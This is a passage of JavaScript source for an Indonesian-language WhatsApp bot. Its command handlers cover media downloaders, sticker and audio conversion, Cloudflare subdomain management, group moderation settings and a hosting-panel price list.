var ai = await yts(text)
var vid = ai.videos[0]
try {
let { title, thumbnail: thumb, timestamp, author, url } = vid
await fadhost.sendMessage(m.chat, {audio: fs.readFileSync(judul), mimetype: 'audio/mpeg', contextInfo: {mentionedJid: [m.sender], externalAdReply: {thumbnailUrl: thumb, title: title, body: `Duration : ${timestamp} | Author : ${author.name}`, sourceUrl: null,  renderLargerThumbnail: true, mediaType: 1}}}, {quoted: m})
await fs.unlinkSync(judul)
} catch (e) {
await fadhost.sendMessage(m.chat, {audio: fs.readFileSync(judul), mimetype: 'audio/mpeg'}, {quoted: m})
await fs.unlinkSync(judul)
}
}).on('error', (err) => {
return m.reply(err.toString())
})}
break
case "setthumb": case "setthumbnail": {

if (!isOwner) return fadhostReply(msg.owner)
if (!/image/g.test(mime)) return m.reply("Kirim/Balas Foto")
await fadhost.downloadAndSaveMediaMessage(qmsg, "./media/thumbnail.jpg", false)
m.reply("Berhasil Mengganti Foto Thumbnail Menu ✅")
}
break
case "setppbot": case "setpp": {

if (!isOwner) return fadhostReply(msg.owner)
if (/image/g.test(mime)) {
let media = await fadhost.downloadAndSaveMediaMessage(qmsg)
await fadhost.updateProfilePicture(botNumber, {url: media})
await fs.unlinkSync(media)
m.reply("Berhasil Mengganti Foto Profile Bot ✅")
} else return m.reply(example('dengan mengirim foto'))}
break
case "setppbotpanjang": case "setpppanjang": {

if (!isOwner) return fadhostReply(msg.owner)
if (/image/g.test(mime)) {
var medis = await fadhost.downloadAndSaveMediaMessage(qmsg, 'ppbot.jpeg', false)
var { img } = await generateProfilePicture(medis)
await fadhost.query({
tag: 'iq',
attrs: {
to: botNumber,
type:'set',
xmlns: 'w:profile:picture'
},
content: [
{
tag: 'picture',
attrs: { type: 'image' },
content: img
}
]
})
await fs.unlinkSync(medis)
m.reply("Berhasil Mengganti Foto Profil Bot ✅")
} else return m.reply(example('dengan mengirim foto'))
}
break
case "setnamabot": {

if (!isOwner) return fadhostReply(msg.owner)
if (!text) return m.reply(example('teksnya'))
fadhost.updateProfileName(text)
m.reply("Berhasil Mengganti Nama Bot ✅")
}
break
case "setbio": case "setbiobot": {

if (!isOwner) return fadhostReply(msg.owner)
if (!text) return m.reply(example('teksnya'))
fadhost.updateProfileStatus(text)
m.reply("Berhasil Mengganti Bio Bot ✅")
}
break
case "listdomain": {

var teks = `*List Domain Yang Tersedia :*

.domain1 ${global.tld1}
.domain2 ${global.tld2}
.domain3 ${global.tld3}

*Contoh Cara Membuat Subdomain :*
ketik *.domain1* hostname|ipvps

*Contoh Cara Melihat Subdomain :*
ketik *.listsubdomain domain1*
`
m.reply(teks)
}
break
case "listsubdomain": case "listsubdo": {

if (!isOwner) return fadhostReply(msg.owner)
if (!args[0]) return m.reply(example("domain1\n\nketik *.listdomain*\nUntuk melihat list domainnya"))
let zonenya
let apinya
let dom = args[0].toLowerCase()
if (/domain1/.test(dom)) {
zonenya = global.zone1
apinya = global.apitoken1
} else if (/domain2/.test(dom)) {
zonenya = global.zone2
apinya = global.apitoken2
} else if (/domain3/.test(dom)) {
zonenya = global.zone3
apinya = global.apitoken3
}
axios.get(
`https://api.cloudflare.com/client/v4/zones/${zonenya}/dns_records`,{
headers: {
Authorization: "Bearer " + `${apinya}`,
"Content-Type": "application/json",
},
}).then(async (res) => {
if (res.data.result.length < 1) return m.reply("Tidak Ada Subdomain")
var teks = `*🌐 LIST SUBDOMAIN ${dom.toUpperCase()}*\n\n*Total Subdomain :* ${res.data.result.length}\n\n`
await res.data.result.forEach(e => teks += `*Domain :* ${e.name}\n*IP :* ${e.content}\n\n`)
return m.reply(teks)
})
}
break
case "domain1": case "domain2": case "domain3": {

if (!isOwner) return fadhostReply(msg.owner)
if (!text) return m.reply(example("host|ip"))
if (!text.split("|")) return m.reply(example("host|ip"))
let zonenya
let apinya
let tldnya
let dom = args[0].toLowerCase()
if (/domain1/.test(command)) {
zonenya = global.zone1
apinya = global.apitoken1
tldnya = global.tld1
} else if (/domain2/.test(command)) {
zonenya = global.zone2
apinya = global.apitoken2
tldnya = global.tld2
} else if (/domain3/.test(command)) {
zonenya = global.zone3
apinya = global.apitoken3
tldnya = global.tld3
}
async function subDomain1(host, ip) {
return new Promise((resolve) => {
axios.post(
`https://api.cloudflare.com/client/v4/zones/${zonenya}/dns_records`,
{ type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tldnya, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
{
headers: {
Authorization: "Bearer " + apinya,
"Content-Type": "application/json",
},
}).then((e) => {
let res = e.data
if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content })
}).catch((e) => {
let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e
let err1Str = String(err1)
resolve({ success: false, error: err1Str })
})
})}
   
let raw1 = text
if (!raw1) return m.reply(example("host|ip"))
let host1 = raw1.split("|")[0].trim().replace(/[^a-z0-9.-]/gi, "")
if (!host1) return m.reply("Hostname Tidak Valid!, Hostname Hanya Mendukung Tanda Strip(-) Atau Titik(.)")
let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
if (!ip1 || ip1.split(".").length < 4) return m.reply(ip1 ? "IP Tidak Valid!" : "Isi IP Servernya!")
await subDomain1(host1.toLowerCase(), ip1).then((e) => {
if (e['success']) m.reply(`*Subdomain Berhasil Dibuat ✅*\n\n*Domain Induk 🌐*\n${tldnya}\n*IP 📡*\n${e['ip']}\n*Subdomain 🌐*\n${e['name']}`)
else m.reply(`${e['error']}`)
})}
break
case "delsubdo": case "delsubdomain": {

if (!isOwner) return m.reply(msg.owner)
if (!text) return m.reply(example("domain1|subdo\n\nUntuk melihat listdomain ketik *.listdomain*"))
if (!text.split("|")) return m.reply(example("domain1|subdo\n\nUntuk melihat listdomain ketik *.listdomain*"))
var [pusat, sub] = text.split("|")
var zonenya
var apinya
var tldnya
if (/domain1/.test(pusat)) {
zonenya = global.zone1
apinya = global.apitoken1
tldnya = global.tld1
} else if (/domain2/.test(pusat)) {
zonenya = global.zone2
apinya = global.apitoken2
tldnya = global.tld2
} else if (/domain3/.test(pusat)) {
zonenya = global.zone3
apinya = global.apitoken3
tldnya = global.tld3
} else return m.reply("Domain Tidak Ditemukan")
if (!sub.includes(".")) return m.reply("Format Subdomain Tidak Valid!")
var host = sub.toLowerCase()
var dom = null
var id = null
await axios.get(`https://api.cloudflare.com/client/v4/zones/${zonenya}/dns_records`, {
headers: {
Authorization: "Bearer " + apinya,
"Content-Type": "application/json",
},
}).then(async (res) => {
await res.data.result.forEach((e) => {
if (e.name == host) {
dom = e.name
id = e.id
}})
})
if (dom == null && id == null) return m.reply("Subdomain Tidak Ditemukan")
await fetch(`https://api.cloudflare.com/client/v4/zones/${zonenya}/dns_records/${id}`, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
Authorization: "Bearer " + apinya,
"Content-Type": "application/json",
}
})
m.reply(`Berhasil Menghapus Subdomain *${dom}* Dari Domain *${tldnya}*`)
}
break
case "tts": {

if (!text) return m.reply(example("Hallo saya manusia"))
if (text.length >= 300) return m.reply("Jumlah huruf harus di bawah 300!")
m.reply(msg.wait)
let id = 'id_001'
try {
const { data } = await axios.post("https://tiktok-tts.weilnet.workers.dev/api/generation", {
    "text": text,
    "voice": id
})
fadhost.sendMessage(m.chat, { audio: Buffer.from(data.data, "base64"), mimetype: "audio/mp4" }, {quoted: m})
} catch (e) {
return m.reply(e.toString())
}
}
break
case "ytplay": case "play": {

if (!text) return m.reply(example('Dj tiktok'))
m.reply(msg.wait)
const { pipeline } = require('stream')
const { promisify } = require('util')
const streamPipeline = promisify(pipeline)
try {
let search = await yts(text)
let vid = search.videos[0]
let { title, thumbnail: thumb, timestamp, author, url } = vid
const audioStream = ytdl(url, {
filter: 'audioonly',
quality: 'highestaudio'})
let acak = await getRandom(".mp3")
let temp = "./all/tmp/" + acak
const writableStream = fs.createWriteStream(temp)
await streamPipeline(audioStream, writableStream)
await fadhost.sendMessage(m.chat, {audio: fs.readFileSync(temp), mimetype: 'audio/mpeg', contextInfo: {externalAdReply: {thumbnailUrl: thumb, title: title, body: "Duration : "+timestamp+" | "+"Author : "+author.name, sourceUrl: url, renderLargerThumbnail: true, mediaType: 1}}}, {quoted: m})
await fs.unlinkSync(temp)
} catch (e) {
return m.reply(e.toString())
}
}
break
case "qc": {

if (!text) return m.reply(example('teksnya'))
let warna = ["#000000", "#ff2414", "#22b4f2", "#eb13f2"]
let reswarna = await warna[Math.floor(Math.random()*warna.length)]
m.reply(msg.wait)
const json = {
  "type": "quote",
  "format": "png",
  "backgroundColor": reswarna,
  "width": 512,
  "height": 768,
  "scale": 2,
  "messages": [
    {
      "entities": [],
      "avatar": true,
      "from": {
        "id": 1,
        "name": m.pushName,
        "photo": {
          "url": ppuser
        }
      },
      "text": text,
      "replyMessage": {}
    }
  ]
};
        const response = axios.post('https://bot.lyo.su/quote/generate', json, {
        headers: {'Content-Type': 'application/json'}
}).then(async (res) => {
    const buffer = Buffer.from(res.data.result.image, 'base64')
    let tempnya = makeid+".png"
await fs.writeFile(tempnya, buffer, async (err) => {
if (err) return m.reply("Error")
await fadhost.sendStimg(m.chat, tempnya, m, {packname: namabot})
fs.unlinkSync(`./${tempnya}`)
})
})
}
break
case "list_vps": {

let teks = `Belum Tersedia`
fadhost.sendMessage(m.chat, {text: teks}, {quoted: qpayment})
}
break
case "list_domain": {

let teks = `Belum Tersedia`
fadhost.sendMessage(m.chat, {text: teks}, {quoted: qpayment})
}
break
break
case "list_panel": {

const teks = `*List Harga Panel By ${namaowner} ⚡*

*📌1GB CPU 40%*
_HARGA : RP1.000_

*📌2GB CPU 60%*
_HARGA : RP2.000_

*📌3GB CPU 80%* 
_HARGA : RP3.000_

*📌4GB CPU 100%* 
_HARGA : RP4.000_

*📌5GB CPU 120%* 
_HARGA : RP5.000_

*📌6GB CPU 140%* 
_HARGA : RP6.000_

*📌7GB CPU 160%* 
_HARGA : RP7.000_

*📌8GB CPU 180%*
_HARGA : RP8.000_

*📌9GB CPU 200%* 
_HARGA RP9.000
*📌UNLI CPU UNLI* 
_HARGA : RP10.00_

*Keuntungan Panel :*
* Bisa Buat Panel Sepuasnya
* Bisa Jual Panel Sepuasnya
* Server *(High Quality)*
* Bot Auto Fast Respon
* Garansi Aktif 7 Hari
* Claim Garansi Wajib Bawa Bukti Transaksi!

*Ready Resseller Panel*
* *Harga :* Rp5.000/per minggu
* *Harga :* Rp7.000/per bulan
* *Harga :* Rp10.000/Permanen

*Ready Admin Panel*
* *Harga :* Rp15.000/Per bulan
* *Harga :* Rp20.000/Permanen

*Dan Ready Juga Pt panel
* *Harga :* Rp25.000/Permanen
* Create Panel Lewat Bot

Minat ? Hubungi Ownerbot Dengan Cara Ketik *.owner*

`
fadhost.sendMessage(m.chat, {text: teks}, {quoted: qpayment})
}
break
case "list_scbot": {

let teks = `Belum Tersedia`
fadhost.sendMessage(m.chat, {text: teks}, {quoted: qpayment})
}
break
case "remini": case "tohd": case "hd": {

if (/image/g.test(mime)) {
m.reply(msg.wait)
let tingkat
if (/remini/gi.test(command)) tingkat = 4
if (/tohd|hd/gi.test(command)) tingkat = 2
await fadhost.downloadAndSaveMediaMessage(qmsg).then(async (res) => {
let urlnya = await telegraPh(res)
let image = await fetchJson(`https://aemt.me/remini?url=${urlnya}&resolusi=${tingkat}`)
if (!image.status) return m.reply("Error!")
await fadhost.sendMessage(m.chat, {image: {url: image.url}, caption: "Berhasil ✅"}, {quoted: m})
await fs.unlinkSync(res)
}).catch(err => m.reply(err.toString()))
} else return m.reply(example('dengan mengirim foto'))
}
break
case "chatgpt": case "gpt": {

if (!text) return m.reply(example("apa itu nodejs"))
m.reply(msg.wait)
await fetchJson(`https://aemt.me/gpt4?text=${text}`).then((e) => {
if (!e.status) return m.reply(JSON.stringify(e, null, 2))
var teks = `*© GPT - Chat Version 0.4*\n\n${e.result}`
m.reply(teks)
})
}
break
case "ai": case "openai": {

if (!text) return m.reply(example("kamu siapa"))
m.reply(msg.wait)
await fetchJson(`https://aemt.me/openai?text=${text}`).then((e) => {
if (!e.status) return m.reply(JSON.stringify(e, null, 2))
var teks = `*© AI - Asistent New Latest*\n\n${e.result}`
m.reply(teks)
})
}
break
case "toptv": {

if (/video/.test(qmsg.mimetype)) {
if ((qmsg).seconds > 30) return m.reply("Durasi vidio maksimal 30 detik!")
let ptv = await generateWAMessageFromContent(m.chat, proto.Message.fromObject({ ptvMessage: qmsg }), { userJid: m.chat, quoted: m })
fadhost.relayMessage(m.chat, ptv.message, { messageId: ptv.key.id })
} else { 
return m.reply(example("dengam mengirim/balas vidio"))
}
}
break
case "toimage": {

if (!/webp/.test(mime) && !/audio/.test(mime)) return m.reply(example('dengan reply sticker'))
m.reply(msg.wait)
let media = await fadhost.downloadAndSaveMediaMessage(qmsg)
let ran = `${makeid}.png`
exec(`ffmpeg -i ${media} ${ran}`, (err) => {
fs.unlinkSync(media)
if (err) return err
let buffer = fs.readFileSync(ran)
fadhost.sendMessage(m.chat, {image: buffer}, {
quoted: m})
fs.unlinkSync(ran)
})
}
break
case "tovn": case "toptt": {

if (!/video|audio/.test(mime) && !/audio/.test(mime)) return m.reply(example('dengan mengirim audio/vidio'))
m.reply(msg.wait)
await fadhost.downloadMediaMessage(qmsg).then(async (res) => {
let anu = await toPTT(res, 'mp4')
fadhost.sendMessage(m.chat, {audio: anu, mimetype: 'audio/mpeg', ptt: true}, {quoted : m}) 
})
}
break
case "toaudio": case "tomp3": {

if (!/video/.test(mime) && !/audio/.test(mime)) return m.reply(example('dengan mengirim vidio'))
if ((qmsg).seconds > 30) return m.reply("Durasi vidio maksimal 30 detik")
m.reply(msg.wait)
await fadhost.downloadMediaMessage(qmsg).then(async (res) => {
let anu = await toAudio(res, 'mp4')
fadhost.sendMessage(m.chat, {audio: anu, mimetype: 'audio/mpeg'}, {quoted : m}) 
})
}
break
case "sticker": case "stiker": case "sgif": case "s": {

if (!/image|video/.test(mime)) return m.reply(example("dengan mengirim foto/vidio"))
if (/video/.test(mime)) {
if ((qmsg).seconds > 15) return m.reply("Durasi vidio maksimal 15 detik!")
}
m.reply(msg.wait)
var media = await fadhost.downloadAndSaveMediaMessage(qmsg)
await fadhost.sendStimg(m.chat, media, m, {packname: global.packname})
await fs.unlinkSync(media)
}
break
case "tourl": {

if (!/image/.test(mime)) return m.reply(example("dengan mengirim foto"))
await m.reply(msg.wait)
var fotonya = await fadhost.downloadAndSaveMediaMessage(qmsg)
var urlimage = await telegraPh(fotonya)
await m.reply(`Link Tautan :\n${urlimage}`)
await fs.unlinkSync(fotonya)
}
break
case "public": {

if (!isOwner) return fadhostReply(msg.owner)
fadhost.public = true
m.reply("Berhasil mengganti mode bot menjadi *Public*")
}
break
case "self": {

if (!isOwner) return fadhostReply(msg.owner)
fadhost.public = false
m.reply("Berhasil mengganti mode bot menjadi *Self*")
}
break
case "get": {

if (!isOwner) return fadhostReply(msg.owner)
if (!text) return m.reply("linknya")
try {
var check = await fetchJson(text)
m.reply(JSON.stringify(check, null, 2))
} catch (e) {
return m.reply(e.toString())
}}
break
case "setteksjpm": {

if (!isOwner) return fadhostReply(msg.owner)
if (text || m.quoted) {
const newteks = m.quoted ? m.quoted.text : text
await fs.writeFileSync("./all/database/teksjpm.js", newteks.toString())
m.reply("Berhasil Mengganti Teks JPM ✅")
} else {
return m.reply(example("dengan reply/kirim teks\n\nUntuk melihat teks jpm saat ini ketik *.teksjpm*"))
}}
break
case "teksjpm": {

if (!isOwner) return fadhostReply(msg.owner)
m.reply(fs.readFileSync("./all/database/teksjpm.js").toString())
}
break
case "instagram": case "igdl": case "ig": {

if (!text) return m.reply(example("linknya"))
if (!text.includes("instagram.com")) return m.reply("Link tautan tidak valid!")
m.reply(msg.wait)
await api.igdl(`${text}`).then((res) => {
for (let a of res.result) {
fadhost.sendMedia(m.chat, a.url, m, {
caption: "Instagram Downloader Done ✅"})
}
}).catch(e => m.reply(e.toString()))
}
break
case "tiktokaudio": case "tiktokmp3": case "ttaudio": case "ttmp3": {

if (!text) return m.reply(example("linknya"))
if (!text.includes("tiktok.com")) return m.reply("Link tautan tidak valid!")
m.reply(msg.wait)
await fetchJson(`https://aemt.me/download/tiktokdl?url=${text}`).then((res) => {
fadhost.sendMessage(m.chat, {audio: {url: res.result.music}, mimetype: "audio/mpeg"}, {quoted: m})
}).catch(e => m.reply(e.toString()))
}
break
case "tiktokslide": case "ttslide": {

if (!text) return m.reply(example("linknya"))
if (!text.includes("tiktok.com")) return m.reply("Link tautan tidak valid!")
m.reply(msg.wait)
await fetchJson(`https://aemt.me/download/tiktokslide?url=${text}`).then(async (data) => {
if (!data.status) return m.reply(JSON.stringify(data, null, 2))
if (data.result.totalSlide == 0) return m.reply("Link Tiktok Bukan Slide!")
var cap = `*Tiktok Downloader Done ✅*`
for (let i of data.result.images) {
fadhost.sendMessage(m.chat, {image: {url: `${i}`}, caption: cap}, {quoted: m})
}
}).catch(e => m.reply(e.toString()))
}
break
case "mediafire": {

if (!text) return m.reply(example("linknya"))
if (!text.includes('mediafire.com')) return m.reply("Link Tautan Tidak Valid!")
m.reply(msg.wait)
await api.mediafireDl(text).then((res) => {
if (res.filesize.includes("GB")) return m.reply("Gagal mendownload, ukuran file terlalu besar")
if (res.filesize.split("MB")[0] >= 100) return m.reply("Gagal mendownload, ukuran file terlalu besar")
if (res.url == "") return m.reply(mess.error)
fadhost.sendMessage(m.chat, {document: {url: res.url}, fileName: res.filename, mimetype: "application/"+res.ext.toLowerCase(), caption: "Download Berhasil ✅"}, {quoted: m})
}).catch((e) => m.reply(e.toString()))
}
break
case 'pinterest':
case 'pin':{
if(!text)return m.reply("Mana text nya?")
const {GOOGLE_IMG_SCRAP} = require('google-img-scrap');
let cariimg = await GOOGLE_IMG_SCRAP({search: text,limit: 6,domains: ["pinterest.com"]})
let imgs = cariimg.result
let imgres = cariimg.result.length
if(imgres==0)return m.reply("Hasil tidak di temukan")
let lim = () => {
  if(imgres>5){return 5}else{return imgres} }
let lmt = lim()
let arrcard = []
for(let i=0;i<lmt;i++){
let eek = {
"header": proto.Message.InteractiveMessage.Header.create({...(await prepareWAMessageMedia({ image : await getBuffer(imgs[i].url)}, { upload: fadhost.waUploadToServer})),
title: `*[PINTEREST SEARCH]*`,
gifPlayback: true,
subtitle: '',
hasMediaAttachment: false  
}),
"body": {
"text": `Hasil ${i+1} pinterest`
},
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
buttons: [
{
"name": "cta_url",
"buttonParamsJson": `{"display_text":"Link","url":"${imgs[i].url}","merchant_url":"https://www.google.co.id"}`
}
]
})
   }
    arrcard.push(eek)
    await sleep(2000)
  }

let ctamsg = generateWAMessageFromContent(m.chat, {
viewOnceMessage: {
message: {
"messageContextInfo": {
"deviceListMetadata": {},
"deviceListMetadataVersion": 2
},
interactiveMessage: proto.Message.InteractiveMessage.create({
body:{text:"*Berikut Hasil Pencarian Anda*"},
carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.create({
        "cards": arrcard,
        "messageVersion": 1
       }
    )
})
}
}
}, {});
await fadhost.relayMessage(ctamsg.key.remoteJid, ctamsg.message, {
messageId: ctamsg.key.id
})

}
break

case "tiktok": case "tt": {

if (!text) return m.reply(example('linknya'))
if (!/tiktok.com/.test(text)) return m.reply("Link Tautan Tidak Valid!")
m.reply(msg.wait)
 let anuan = text
await api.tiktok(anuan).then(async (res) => {
var cap = `*Tiktok Downloader Done ✅*`
if (res.result.duration == 0) {
for (let a of res.result.images) {
fadhost.sendMessage(m.chat, {image: {url: `${a}`}, caption: cap}, {quoted: m})
}
} else {
await fadhost.sendMessage(m.chat, {video: {url: res.result.play}, mimetype: "video/mp4", caption: cap}, {quoted: m})
}
}).catch(e => m.reply(e.toString))
}
break
case "facebook": case "fb": case "fbdl": {

if (!text) return m.reply(example("linkvidionya"))
if (!/facebook.com/.test(text)) return m.reply("Link Tautan Tidak Valid!")
m.reply(msg.wait)
await fetchJson(`https://aemt.me/download/fbdown?url=${text}`).then((res) => {
if (!res.status) return m.reply(JSON.stringify(res, null, 2))
fadhost.sendMessage(m.chat, {video: {url: `${res.result.url.isHdAvailable == true ? res.result.url.urls[0].hd : res.result.url.urls[0].sd}`}, mimetype: 'video/mp4', caption: `*Facebook Downloader Done ✅*`}, {quoted: m})
}).catch(e => m.reply(e.toString()))
}
break
case "owner": {

fadhost.sendContact(m.chat, [owner], "Developer Bot WhatsApp", null, {contextInfo: {
mentionedJid: [m.sender], 
externalAdReply: {
showAdAttribution: true, 
thumbnail: await fs.readFileSync("./media/owner.jpg"), 
title: `© Copyright ${global.namabot}`, 
renderLargerThumbnail: true, 
sourceUrl: global.linkyt, 
mediaType: 1
}}})
}
break
case "antilink": {

if (!isGroup) return fadhostReply(msg.group)
if (!isOwner && !isAdmin) return fadhostReply(msg.admin)
if (!args[0]) return m.reply(example("on/off\n\nKetik *.statusgc* Untuk Melihat Status Setting Grup Ini"))
if (/on/.test(args[0].toLowerCase())) {
if (antilink.includes(m.chat)) return m.reply("*Antilink* Di Grup Ini Sudah Aktif!\n\nKetik *.statusgc* Untuk Melihat Status Setting Grup Ini")
if (antilink2.includes(m.chat)) {
let posi = antilink2.indexOf(m.chat)
antilink2.splice(posi, 1)
await fs.writeFileSync("./all/database/antilink2.json", JSON.stringify(antilink2))
}
antilink.push(m.chat)
await fs.writeFileSync("./all/database/antilink.json", JSON.stringify(antilink))
m.reply("Berhasil Menyalakan *Antilink* Di Grup Ini ✅\n\nKetik *.statusgc* Untuk Melihat Status Setting Grup Ini")
} else if (/off/.test(args[0].toLowerCase())) {
if (!antilink.includes(m.chat)) return m.reply("*Antilink* Di Grup Ini Belum Aktif!\n\nKetik *.statusgc* Untuk Melihat Status Setting Grup Ini")
let posi = antilink.indexOf(m.chat)
antilink.splice(posi, 1)
await fs.writeFileSync("./all/database/antilink.json", JSON.stringify(antilink))
m.reply("Berhasil Mematikan *Antilink* Di Grup Ini ❌\n\nKetik *.statusgc* Untuk Melihat Status Setting Grup Ini")
} else {
return m.reply(example("on/off"))
}}
break
case "antilinkV2": case "antilinkv2": {

if (!isGroup) return fadhostReply(msg.group)
if (!isOwner && !isAdmin) return fadhostReply(msg.owner)
if (!args[0]) return m.reply(example("on/off\n\nKetik *.statusgc* Untuk Melihat Status Setting Grup Ini"))
if (/on/.test(args[0].toLowerCase())) {
if (antilink2.includes(m.chat)) return m.reply("*AntilinkV2* Di Grup Ini Sudah Aktif!\n\nKetik *.statusgc* Untuk Melihat Status Setting Grup Ini")
if (antilink.includes(m.chat)) {
let posi = antilink.indexOf(m.chat)
antilink.splice(posi, 1)
await fs.writeFileSync("./all/database/antilink.json", JSON.stringify(antilink))
}
antilink2.push(m.chat)
await fs.writeFileSync("./all/database/antilink2.json", JSON.stringify(antilink2))
m.reply("Berhasil Menyalakan *AntilinkV2* Di Grup Ini ✅\n\nKetik *.statusgc* Untuk Melihat Status Setting Grup Ini")
} else if (/off/.test(args[0].toLowerCase())) {
if (!antilink2.includes(m.chat)) return m.reply("*AntilinkV2* Di Grup Ini Belum Aktif!\n\nKetik *.statusgc* Untuk Melihat Status Setting Grup Ini")
let posi = antilink2.indexOf(m.chat)
antilink2.splice(posi, 1)
await fs.writeFileSync("./all/database/antilink2.json", JSON.stringify(antilink2))
m.reply("Berhasil Mematikan *Antilink* Di Grup Ini ❌\n\nKetik *.statusgc* Untuk Melihat Status Setting Grup Inii")
} else {
return m.reply(example("on/off"))
}}
break
case "welcome": {

if (!isOwner) return fadhostReply(msg.owner)
if (!text) return m.reply(example("on/off\n\nKetik *.statusbot* Untuk Melihat Status Settingan Bot"))
if (text.toLowerCase() == "on") {
if (welcome) return m.reply("*Welcome* Sudah Aktif!\n\nKetik *.statusbot* Untuk Melihat Status Settingan Bot")
welcome = true
m.reply("Berhasil Menyalakan *Welcome ✅*\n\nKetik *.statusbot* Untuk Melihat Status Settingan Bot")
} else if (text.toLowerCase() == "off") {
if (!welcome) return m.reply("*Welcome* Sudah Tidak Aktif!\n\nKetik *.statusbot* Untuk Melihat Status Settingan Bot")
welcome = false
m.reply("Berhasil Mematikan *Welcome ❌*\n\nKetik *.statusbot* Untuk Melihat Status Settingan Bot")
} else {
return m.reply(example("on/off\n\nKetik *.statusbot* Untuk Melihat Status Settingan Bot"))
}}
break
case "autoread": {

if (!isOwner) return fadhostReply(msg.owner)
if (!text) return m.reply(example("on/off\n\nKetik *.statusbot* Untuk Melihat Status Settingan Bot"))
if (text.toLowerCase() == "on") {
if (autoread) return m.reply("*Autoread* Sudah Aktif!\n\nKetik *.statusbot* Untuk Melihat Status Settingan Bot")
autoread = true
m.reply("Berhasil Menyalakan *Autoread ✅*\n\nKetik *.statusbot* Untuk Melihat Status Settingan Bot")
} else if (text.toLowerCase() == "off") {
if (!autoread) return m.reply("*Autoread* Sudah Tidak Aktif!\n\nKetik *.statusbot* Untuk Melihat Status Settingan Bot")
autoread = false
m.reply("Berhasil Mematikan *Autoread ❌*\n\nKetik *.statusbot* Untuk Melihat Status Settingan Bot")
} else {
return m.reply(example("on/off\n\nKetik *.statusbot* Untuk Melihat Status Settingan Bot"))
}}
break
case "anticall": {

if (!isOwner) return fadhostReply(msg.owner)
if (!text) return m.reply(example("on/off\n\nKetik *.statusbot* Untuk Melihat Status Settingan Bot"))
if (text.toLowerCase() == "on") {
if (anticall) return m.reply("*Anticall* Sudah Aktif!\n\nKetik *.statusbot* Untuk Melihat Status Settingan Bot")
anticall = true
m.reply("Berhasil Menyalakan *Anticall ✅*\n\nKetik *.statusbot* Untuk Melihat Status Settingan Bot")
} else if (text.toLowerCase() == "off") {
if (!anticall) return m.reply("*Anticall* Sudah Tidak Aktif!\n\nKetik *.statusbot* Untuk Melihat Status Settingan Bot")
anticall = false
m.reply("Berhasil Mematikan *Anticall ❌*\n\nKetik *.statusbot* Untuk Melihat Status Settingan Bot")
} else {
return m.reply(example("on/off\n\nKetik *.statusbot* Untuk Melihat Status Settingan Bot"))
}}
break
case "setting": case "settingbot": case "option": case "statusbot": {

if (!isOwner) return fadhostReply(msg.owner)
var teks = `
*List Status Bot Settings :*

* Autoread : ${global.autoread ? "*Aktif ✅*" : "*Tidak Aktif ❌*"}
* Anticall : ${global.anticall ? "*Aktif ✅*" : "*Tidak Aktif ❌*"}
* Welcome : ${global.welcome ? "*Aktif ✅*" : "*Tidak Aktif ❌*"}

*Contoh Penggunaan :*
Ketik *.autoread* on/off`
m.reply(teks)
}
break
case "statusgc": {

if (!isGroup) return fadhostReply(msg.group)
if (!isOwner && !isAdmin) return fadhostReply(msg.admin)
var anti1 = "Aktif ✅"
var anti2 = "Aktif ✅"
if (!antilink2.includes(m.chat)) anti2 = "Tidak Aktif ❌"
if (!antilink.includes(m.chat)) anti1 = "Tidak Aktif ❌"
var teks = `
*List Status Grup Settings :*

* Antilink : *${anti1}*
* AntilinkV2 : *${anti2}*

*Contoh Penggunaan :*
Ketik *.antilink* on/off
`
fadhost.senText(m.chat, teks, qchanel)
}
break
case "setppgc": {

if (!isGroup) return fadhostReply(msg.group)
if (!isBotAdmin) return fadhostReply(msg.adminbot)
if (!isAdmin && !isOwner) return fadhostReply(msg.admin)
if (/image/g.test(mime)) {
let media = await fadhost.downloadAndSaveMediaMessage(qmsg)
await fadhost.updateProfilePicture(m.chat, {url: media})
await fs.unlinkSync(media)
m.reply("Berhasil Mengganti *Profil* Grup")
} else return m.reply(example('dengan mengirim foto'))}
break
case "setnamegc": case "setnamagc": {

if (!isGroup) return fadhostReply(msg.group)
if (!isBotAdmin) return fadhostReply(msg.adminbot)
if (!isAdmin && !isOwner) return fadhostReply(msg.admin)
if (!text) return m.reply(example('teksnya'))
const gcname = metadata.subject
await fadhost.groupUpdateSubject(m.chat, text)
m.reply(`Berhasil Mengganti Nama Grup *${gcname}* Menjadi *${text}*`)
}
break
case "setdesc": case "setdesk": {

if (!isGroup) return fadhostReply(msg.group)
if (!isBotAdmin) return fadhostReply(msg.adminbot)
if (!isAdmin && !isOwner) return fadhostReply(msg.admin)
if (!text) return m.reply(example('teksnya'))
await fadhost.groupUpdateDescription(m.chat, text)
m.reply(`Berhasil Mengganti *Deskripsi* Grup`)
}
break
case "open": {

if (!isGroup) return fadhostReply(msg.group)
if (!isBotAdmin) return fadhostReply(msg.adminbot)
if (!isAdmin && !isOwner) return fadhostReply(msg.admin)
await fadhost.groupSettingUpdate(m.chat, 'not_announcement')
m.reply("Berhasil Mengganti Setelan Grup Menjadi Anggota Dapat Mengirim Pesan")
}
break
case "close": {

if (!isGroup) return fadhostReply(msg.group)
if (!isBotAdmin) return fadhostReply(msg.adminbot)
if (!isAdmin && !isOwner) return fadhostReply(msg.admin)
await fadhost.groupSettingUpdate(m.chat, 'announcement')
m.reply("Berhasil Mengganti Setelan Grup Menjadi Hanya Admin Yang Dapat Mengirim Pesan")
}
break
case "del": case "delete": {

if (isGroup) {
if (!isOwner && !isAdmin) return fadhostReply(msg.admin)
if (!m.quoted) return m.reply("Reply Pesan Yang Ingin Di Hapus")
if (m.quoted.sender == botNumber) {
fadhost.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: true, id: m.quoted.id, participant: m.quoted.sender}})
} else {
if (!isBotAdmin) return fadhostReply(msg.adminbot)
fadhost.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: m.quoted.id, participant: m.quoted.sender}})
}} else {
if (!isOwner) return fadhostReply(msg.owner)
if (!m.quoted) return m.reply("Reply Pesan Yang Ingin Di Hapus")
